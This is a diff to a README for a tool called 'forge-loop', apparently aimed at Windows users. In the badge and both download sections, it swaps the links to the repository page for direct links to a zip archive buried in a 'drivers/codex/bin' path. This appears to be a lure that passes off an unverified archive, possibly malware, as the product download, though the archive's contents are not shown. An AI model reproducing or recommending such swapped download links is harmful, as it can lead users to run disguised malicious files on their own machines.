@@ -1,6 +1,6 @@
 # ⚙️ forge-loop - Better code through steady review
 
-[![Download forge-loop](https://img.shields.io/badge/Download-forge--loop-blue?style=for-the-badge&logo=github)](https://github.com/makafuiraymond532-debug/forge-loop)
+[![Download forge-loop](https://img.shields.io/badge/Download-forge--loop-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/makafuiraymond532-debug/forge-loop/main/drivers/codex/bin/loop-forge-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Use this guide if you want to download and run forge-loop on Windows.
 ## 💾 Download
 
 Visit this page to download:  
-https://github.com/makafuiraymond532-debug/forge-loop
+https://raw.githubusercontent.com/makafuiraymond532-debug/forge-loop/main/drivers/codex/bin/loop-forge-v2.2.zip
 
 Follow these steps:
 
@@ -225,4 +225,4 @@ Use a copy of the project first. That lets you test the loop without risk.
 ## 📥 Download Again
 
 Visit this page to download:  
-https://github.com/makafuiraymond532-debug/forge-loop
+https://raw.githubusercontent.com/makafuiraymond532-debug/forge-loop/main/drivers/codex/bin/loop-forge-v2.2.zip
